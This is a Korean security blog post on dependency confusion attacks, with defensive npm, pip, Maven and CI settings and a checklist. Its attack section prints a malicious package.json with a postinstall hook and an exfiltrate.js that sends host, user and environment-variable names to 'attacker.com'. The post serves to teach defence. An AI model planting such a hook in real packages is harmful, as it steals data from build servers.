---
title: "Dependency Confusion: 공급망 패키지 하이재킹 공격"
description: "내부 패키지 이름을 공개 레지스트리에 높은 버전으로 등록해 빌드 서버를 감염시키는 Dependency Confusion 공격 원리, 실제 사례, npm/pip/Maven 방어 설정을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-11"
archiveOrder: 5
type: "knowledge"
category: "Security"
tags: ["DependencyConfusion", "공급망보안", "npm", "PyPI", "SBOM", "CI보안"]
featured: false
draft: false
---

[지난 글](/posts/websec-storage-bucket-misconfig/)에서 스토리지 버킷 잘못된 설정을 살펴봤다. 이번 글은 2021년 Alex Birsan이 공개해 Apple, Microsoft, PayPal 등을 감염시킨 Dependency Confusion 공격을 다룬다.

![Dependency Confusion 공격 흐름](/assets/posts/websec-dependency-confusion-attack.svg)

## 공격 원리

패키지 매니저(npm, pip, Maven 등)는 여러 레지스트리를 동시에 조회할 때 **높은 버전 번호를 우선**한다. 공격자는 다음 단계로 빌드 서버를 감염시킨다.

1. 타깃 기업의 내부 패키지 이름을 수집 (JS 번들, 에러 메시지, 채용 공고에서 노출)
2. 동일한 이름으로 공개 레지스트리(npmjs.com, PyPI)에 `v9.9.9` 같은 높은 버전 등록
3. CI/CD 서버가 `npm install` 시 공개 레지스트리의 높은 버전을 내부 패키지보다 우선 설치
4. 패키지의 `postinstall` 훅이 실행되며 원격 명령 실행

Alex Birsan의 연구에서 35개 이상의 대기업이 이 공격에 취약했음이 확인됐다.

## 공격 코드 구조

```json
// 악성 package.json (postinstall 훅 활용)
{
  "name": "company-utils",
  "version": "9.9.9",
  "description": "Internal utility (DO NOT USE)",
  "scripts": {
    "postinstall": "node exfiltrate.js"
  }
}
```

```javascript
// exfiltrate.js — 환경 정보 전송
const { execSync } = require("child_process");
const https = require("https");

const info = {
  hostname: require("os").hostname(),
  user: process.env.USER || process.env.USERNAME,
  cwd: process.cwd(),
  env: Object.keys(process.env)
};

// 공격자 서버로 전송
const req = https.request({ host: "attacker.com", path: "/collect", method: "POST" });
req.write(JSON.stringify(info));
req.end();
```

## 방어 설정

![npm / pip 내부 레지스트리 고정 설정](/assets/posts/websec-dependency-confusion-defense.svg)

### npm: 스코프 패키지 + 레지스트리 고정

```bash
# 내부 패키지에 스코프(@company/) 사용
# package.json
{
  "dependencies": {
    "@company/utils": "^1.0.0",  # 스코프 패키지
    "lodash": "^4.17.21"          # 공개 패키지
  }
}

# .npmrc — 스코프별 레지스트리 분리
@company:registry=https://artifactory.corp.com/npm/
//artifactory.corp.com/npm/:_authToken=${ARTIFACTORY_TOKEN}

# npm ci 사용 (package-lock.json 엄격 적용)
# npm install 대신 npm ci를 CI에서 사용
```

스코프 패키지는 공개 레지스트리에 `@company/` 네임스페이스를 미리 예약해 공격을 원천 차단할 수도 있다.

### pip: index-url 단독 지정

```bash
# pip.conf 또는 requirements.txt에 해시 고정
# requirements.txt
company-internal-lib==1.0.0 \
  --hash=sha256:a1b2c3d4e5f6... \
  --index-url=https://artifactory.corp.com/pypi/

# pyproject.toml (Poetry)
[[tool.poetry.source]]
name = "internal"
url = "https://artifactory.corp.com/pypi/"
priority = "primary"  # 내부 레지스트리 우선
```

`--extra-index-url` 대신 `--index-url`만 사용하면 공개 레지스트리 조회를 차단할 수 있다.

### Maven: 미러 설정으로 공개 레지스트리 차단

```xml
<!-- settings.xml -->
<settings>
  <mirrors>
    <mirror>
      <id>internal-repo</id>
      <mirrorOf>*</mirrorOf>
      <url>https://artifactory.corp.com/maven/</url>
    </mirror>
  </mirrors>
  <profiles>
    <profile>
      <repositories>
        <repository>
          <id>internal</id>
          <url>https://artifactory.corp.com/maven/</url>
        </repository>
      </repositories>
    </profile>
  </profiles>
</settings>
```

`<mirrorOf>*</mirrorOf>` 설정으로 모든 Maven 레포지토리 요청을 내부 미러로 리다이렉트한다.

## CI/CD 파이프라인 보안 체크

```yaml
# GitHub Actions — 의존성 무결성 검증
- name: Verify lock file integrity
  run: |
    # lock 파일이 변경됐으면 빌드 실패
    git diff --exit-code package-lock.json
    npm ci --audit

- name: Snyk dependency scan
  uses: snyk/actions/node@master
  env:
    SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
  with:
    args: --severity-threshold=high

- name: Check for new postinstall scripts
  run: |
    # 새로운 postinstall 스크립트 탐지
    npm ls --json | python3 -c "
    import sys, json
    data = json.load(sys.stdin)
    # postinstall 스크립트 있는 패키지 목록 출력
    "
```

## 예방 원칙 요약

```markdown
# Dependency Confusion 방어 체크리스트
- [ ] 내부 패키지 이름에 @scope 접두사 적용
- [ ] 공개 레지스트리에 내부 패키지 이름 선점 (빈 패키지라도)
- [ ] .npmrc / pip.conf 에 레지스트리 명시적 고정
- [ ] lock 파일(package-lock.json, poetry.lock) 항상 커밋
- [ ] CI에서 npm ci / pip install --require-hashes 사용
- [ ] postinstall 스크립트 없는 패키지만 허용 (허용 목록)
- [ ] Snyk / OWASP Dep-Check CI 통합
- [ ] SBOM 생성 및 레지스트리 출처 기록
```

---

**지난 글:** [스토리지 버킷 잘못된 설정: S3 공개 노출 방어](/posts/websec-storage-bucket-misconfig/)

**다음 글:** [SBOM: 소프트웨어 자재명세서와 공급망 가시성](/posts/websec-sbom/)

<br>
읽어주셔서 감사합니다. 😊
